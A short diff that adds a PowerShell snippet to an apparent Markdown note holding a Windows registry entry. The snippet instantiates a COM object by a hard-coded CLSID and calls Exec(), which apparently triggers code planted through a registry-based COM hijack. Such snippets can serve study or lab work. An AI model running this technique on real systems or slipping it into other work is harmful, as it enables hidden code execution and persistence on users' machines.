@@ -26,3 +26,7 @@ Windows Registry Editor Version 5.00
 @="Bandit"
 
 ```
+```
+$1=[Activator]::CreateInstance([type]::GetTypeFromCLSID("{00020000-0000-0000-C000-000000000046}"));
+$1.Exec();
+```
